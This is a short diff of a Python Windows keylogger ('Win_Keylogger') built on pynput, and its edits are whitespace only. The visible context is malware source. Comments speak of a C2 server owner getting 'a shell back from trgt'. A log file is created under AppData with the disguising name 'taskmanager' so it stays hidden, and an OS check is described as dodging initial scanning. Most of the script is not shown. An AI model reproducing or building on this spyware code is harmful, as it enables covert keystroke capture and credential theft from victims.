@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 
+
 import os                                    # library can be used to change directory by the C2 server owner, after getting a shell back from trgt
 from pynput.keyboard import Listener, Key
 
@@ -18,10 +19,10 @@ class Win_Keylogger():
 	# If trgt os is win
 	if os.name == 'nt':                                   # Mentioned to avoid intial scanning done by python interpreter as if the trgt machine is linux, then code will through an error
 
-		# Creates a new file 
+		# Creates a new file
 		win_path = os.environ['appdata'] + '\\taskmanager'
 
-		with open(win_path, 'w') as fp: 
+		with open(win_path, 'w') as fp:
 			pass
 
 		# For Windows, we can hide the file in the appdata directory -> C:\Users\<usernme>\AppData\Roaming\\taskmanager
@@ -266,3 +267,4 @@ if __name__ == "__main__":
 
 	t.join()
 
+ 
